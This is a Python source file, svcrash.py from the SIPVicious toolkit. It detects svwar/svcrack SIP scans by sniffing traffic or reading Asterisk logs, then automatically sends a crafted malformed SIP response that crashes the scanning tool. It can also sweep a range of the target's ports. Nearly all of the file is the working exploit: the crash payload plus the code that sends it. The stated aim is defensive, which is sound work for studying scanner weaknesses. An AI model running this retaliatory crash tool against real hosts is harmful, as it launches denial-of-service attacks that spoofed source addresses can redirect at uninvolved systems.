#!/usr/bin/env python
# svcrash.py - SIPvicious crash breaks svwar and svcrack

__GPL__ = """

   Sipvicious crash exploits a bug in svwar/svcrack.py to stop unauthorized
   scans from flooding the network. 
   Copyright (C) 2010  Sandro Gauci <sandro@enablesecurity.com>

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

from svhelper import __author__, __version__

__prog__ = 'svcrash'
import warnings
warnings.filterwarnings("ignore")

import socket
import select
import random
import logging
import sys
import optparse
import time
import re
import os.path
scapyversion = 0
try:
    from scapy.all import *
    scapyversion = 2
except ImportError:
    pass
try:
    from scapy import *
    scapyversion = 1
except ImportError:
    pass


def getArgs():
    parser = optparse.OptionParser(usage="%prog [options]")
    parser.add_option('--auto',help="Automatically send responses to attacks",
                      dest="auto",default=False, action="store_true",)
    parser.add_option('--astlog',help="Path for the asterisk full logfile",
                      dest="astlog")
    parser.add_option('-d',help="specify attacker's ip address", dest="ipaddr",
                      )
    parser.add_option('-p',help="specify attacker's port", dest="port",
                      type="int",default=5060
                      )
    parser.add_option('-b',help="bruteforce the attacker's port", dest="bruteforceport",
                      default=False, action="store_true")
    (options, args) = parser.parse_args()
    if not (options.auto or options.astlog):
        if not options.ipaddr:
            parser.error("When auto or astlog is not specified, you need to pass an IP address")
    elif options.auto:
        if scapyversion == 0:
            parser.error("You need to install scapy from http://www.secdev.org/projects/scapy/")
    elif options.astlog:
        if not os.path.exists(options.astlog):
            parser.error("Could not read %s" % options.astlog)
    if (scapyversion == 0) or not (options.auto):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    
            s.bind(('0.0.0.0',5060))
        except socket.error:
            parser.error("You either need have port 5060 available or install scapy from http://www.secdev.org/projects/scapy/")
    return options,args

class asteriskreadlognsend:
    def __init__(self,logfn):
        self.logfn = logfn
        self.lastsent = 30
        self.matchcount = 0
        self.log = None
        
    def checkfile(self):        
        if (self.log is None) or (self.origlogsize > os.path.getsize(self.logfn)):
            self.log = open(self.logfn,'r')            
            self.origlogsize = os.path.getsize(self.logfn)
            self.log.seek(self.origlogsize)
        
    def findfailures(self):
        self.checkfile()
        buff = self.log.readline()
        if len(buff) == 0:
            time.sleep(1)
            return
        if time.time() - self.lastsent <= 2:
            return        
        match = re.search("Registration from '(.*?)' failed for '(.*?)' - (No matching peer found|Wrong password)",buff)
        if match:                        
            self.matchcount += 1
        if self.matchcount > 6:
            self.matchcount = 0
            return match.group(2)
        else:
            #time.sleep(1)
            return 
    
    def start(self):
        try:
            while 1:
                ipaddr = self.findfailures()
                if ipaddr:
                    for i in xrange(5060,5080):
                        if scapyversion > 0:
                            sendattack2(ipaddr,i)
                        else:
                            sendattack(ipaddr,i)
        except KeyboardInterrupt:
            return
        

class sniffnsend:
    def __init__(self,port=5060):
        self.port = port
        self.lastsent = 30
        self.mytimer = dict()

    def checknsend(self,pkt):
        data = str(pkt.getlayer(Raw))
        ipaddr = pkt.getlayer(IP).src
        port = pkt.getlayer(UDP).sport
        src = ipaddr,port
        if not src in self.mytimer:
            #print "add %s:%s" % src
            self.mytimer[src] = time.time() - 2
        if time.time() - self.mytimer[src] > 2:
            if time.time() - self.lastsent > 0.5:
                if ('User-Agent: friendly-scanner' in data) or \
                    ('User-Agent: Asterisk PBX' in data and 'CSeq: 1 REGISTER' in data):
                    if 'REGISTER ' in data:
                        #print data
                        self.lastsent = time.time()
                        self.mytimer[src] = time.time()
                        sendattack2(ipaddr,port)
        if len(self.mytimer) > 0:
            for src in self.mytimer.keys():
                if time.time() - self.mytimer[src] > 10:
                    #print "del %s:%s:%s" % (str(src),time.time(),self.mytimer[src])
                    del(self.mytimer[src])
                
    
    def start(self):        
        try:
            sniff(prn=self.checknsend,filter="udp port %s" % self.port, store=0)
        except KeyboardInterrupt:
            print "goodbye"

crashmsg='SIP/2.0 200 OK\r\nVia: SIP/2.0/UDP 8.7.6.5:5061;bran'
crashmsg+='ch=z9hG4bK-573841574;rport\r\n\r\nContent-length: 0\r\nFrom: '
crashmsg+='"100"<sip:100@localhost>; tag=683a653a7901746865726501627965\r\nUs'
crashmsg+='er-agent: Telkom Box 2.4\r\nTo: "100"<sip:100@localhost>\r\nCse'
crashmsg+='q: 1 REGISTER\r\nCall-id: 469585712\r\nMax-forwards: 70\r\n\r\n'

def sendattack(ipaddr,port):    
    s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)    
    s.bind(('0.0.0.0',5060))
    dst=ipaddr,port
    s.sendto(crashmsg,dst)
    sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr,port))
    s.close()

def sendattack2(ipaddr,port):
    packet = IP(dst=ipaddr)/UDP(sport=5060,dport=port)/crashmsg
    sys.stdout.write("Attacking back %s:%s\r\n" % (ipaddr,port))
    send(packet,verbose=0)
    
if __name__ == "__main__":
    options,args = getArgs()
    if options.auto:
        sns = sniffnsend()
        sns.start()
    elif options.astlog:
        ast=asteriskreadlognsend(options.astlog)
        ast.start()
    elif options.bruteforceport:
        for port in xrange(5060,5090):
            sendattack(options.ipaddr,port)
    else:
        sendattack(options.ipaddr,options.port)
